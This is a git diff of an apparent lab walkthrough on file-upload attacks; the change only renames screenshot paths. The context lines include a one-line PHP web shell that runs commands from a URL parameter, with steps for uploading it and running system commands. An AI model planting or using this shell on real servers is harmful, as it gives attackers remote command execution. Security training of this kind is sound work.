@@ -7,12 +7,12 @@ Create a PHP web shell.
 <?php system($_GET['cmd']); ?>
 ```
 
-![Target Page](images/01-target-page.__temp__.JPG)
+![Target Page](images/01-target-page.JPG)
 
 ## Step 2
 Upload `shell.php` through the File Upload page.
 
-![Shell Uploaded](images/02-shell-uploaded.__temp__.JPG)
+![Shell Uploaded](images/02-shell-uploaded.JPG)
 
 ## Step 3
 Access the uploaded file and execute a system command.
